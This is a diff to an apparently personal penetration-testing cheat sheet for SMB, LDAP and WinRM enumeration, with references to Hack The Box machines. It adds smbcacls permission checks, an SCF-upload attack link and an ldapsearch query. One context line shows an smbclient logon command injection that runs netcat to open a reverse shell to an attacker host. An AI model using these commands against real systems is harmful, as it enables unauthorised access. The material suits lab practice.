@@ -226,7 +226,13 @@ smbmap -H [IP_ADDRESS]	#Map smb shares using null sessions
 Example: 
 smbmap -H 10.10.10.100 -s Replication -R Replication	#Recursively list dirs in "Replication" share (HTB Active)
 smbmap -R Replication -A Groups.xml -q -H 10.10.10.100	#Define a file name pattern (regex) that auto downloads the file "Groups.xml" (usually it downloads to /usr/share/smbmap/ dir)
- 
+
+#Permission Check	(Example:HTB_SIZZLE https://www.youtube.com/watch?v=YVhlfUvsqYc&t=890s)
+smbcacls -N "//[IP_ADDRESS]/[SHARE]" [DIR]
+
+#Do you have write permissions? Try to upload SCF
+https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+
 rpcclient [IP_ADDRESS] -U “” -N (For more info - https://attackerkb.com/Windows/rpcclient)	#connect to share
 rpcinfo -p [IP_ADDRESS]	(rpcinfo: What services are running?)
 
@@ -241,7 +247,7 @@ mount [IP_ADDRESS]:[PATH] /mnt/[PATH]	#Mount it (linux)
 </pre>
 <p><font size="3.5" color="black">Can you mount the smb share locally?</font></p>
 <pre style="background-color:black;color:white;">
-mount -t cifs //[IP_ADDRESS]/[SHARE] [LOCAL_DIR] -o username=”guest”,password=””
+mount -t cifs "//[IP_ADDRESS]/[SHARE]" [LOCAL_DIR] -o username="guest",password=""
 rlogin [IP_ADDRESS]
 smbclient -L \\[IP_ADDRESS] -U “” -N
 smb: \> logon "/='nc [ATTACKERS_IP] [ATTACKERS_PORT] -e /bin/sh'"	(gain shell)
@@ -339,7 +345,13 @@ HTB Reel - https://www.youtube.com/watch?v=ob9SgtFm6_g&t=2122s
 HTB Active - https://www.youtube.com/watch?v=jUc1J31DNdw&t=1105s
 
 #LDAP enumeration
-man ldapsearch	
+ldapsearch -x -h [HOSTNAME] -s base namingcontexts	
+</pre>
+<hr>
+<p><h3>WinRM</h3></p>
+<pre style="background-color:black;color:white;">
+#WinRM ruby
+https://github.com/WinRb/WinRM (Example: https://www.youtube.com/watch?v=YVhlfUvsqYc&t=1680s)
 </pre>
 <hr>
 <p><h3>NTLM</h3></p>
